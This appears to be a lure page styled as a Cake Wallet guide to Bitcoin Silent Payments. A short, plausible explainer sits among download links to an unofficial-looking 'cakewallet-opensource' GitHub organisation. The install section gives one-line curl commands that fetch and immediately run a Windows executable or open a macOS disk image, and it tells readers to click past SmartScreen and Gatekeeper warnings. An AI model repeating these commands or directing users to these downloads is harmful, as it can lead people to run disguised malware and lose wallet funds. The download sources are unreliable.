![Cake Wallet silent payments guide](assets/cake-wallet-silent-payments-article-banner.png)

# Silent Payments in Cake Wallet

One address, a fresh output for every sender, and the catch.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

A Silent Payment address can be published once and reused, because each sender derives a fresh on-chain output from it. Open the Bitcoin wallet, choose the Silent Payments address type, and share that address instead of a normal one. The sender's wallet must support it, and that dependency is the whole limitation.

<!-- ARTICLE-BODY-BEGIN -->

## Get a Silent Payment address
In the Bitcoin wallet's receive screen, switch the address type to Silent Payments and copy the address it shows. That address is stable: you can post it, print it or put it in a profile without every payment landing on one output.

A normal Bitcoin address accumulates history the moment it is reused, which is the problem this solves. Keep both types available: some senders and most services only understand the ordinary one.

## How it differs from Payjoin
Silent Payments fix the address; Payjoin fixes the transaction. With Silent Payments, the sender's wallet does the work of deriving an output, and the transaction still looks like an ordinary payment to anyone watching.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-payjoin-bitcoin.md">Payjoin in Cake Wallet</a> covers the other half: what happens when both parties cooperate on the same transaction, and why that needs the receiver's wallet to take part.

## Where it works
It is a Bitcoin feature. Other coins have their own privacy designs and do not use this address type, and a Silent Payment address sent to a non-supporting wallet is simply not payable.

That is why publishing one alongside a normal address is worth doing. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md">Cake Wallet supported coins</a> covers the rest of the coin set, so you know which privacy model belongs to which chain.

## Sharing an address privately
Publishing a Silent Payment address is safe in the sense that reuse no longer links payments, but the act of publishing still links the address to you as a person if you post it under your name.

Separating identity from address is a network question. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-tor-orbot.md">Tor with Cake Wallet</a> covers hiding where requests come from, which is a different layer from what the chain records.

## Current release
The address type is available only in builds that implement it, and an older build will show the ordinary address without saying why. Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">latest Cake Wallet release</a> before you assume the option is missing.

If you cannot see the setting after updating, check that you are in a Bitcoin wallet rather than a token or another coin.

## FAQ
### What are Silent Payments?
A Bitcoin address type where each sender derives a fresh output, so publishing one address does not link every payment.
### Does the sender need support?
Yes. A wallet that does not understand the address cannot pay it, so keep a normal address available.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Payjoin in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-payjoin-bitcoin.md) · [Tor with Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-tor-orbot.md) · [Cake Wallet supported coins](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md) · [latest Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
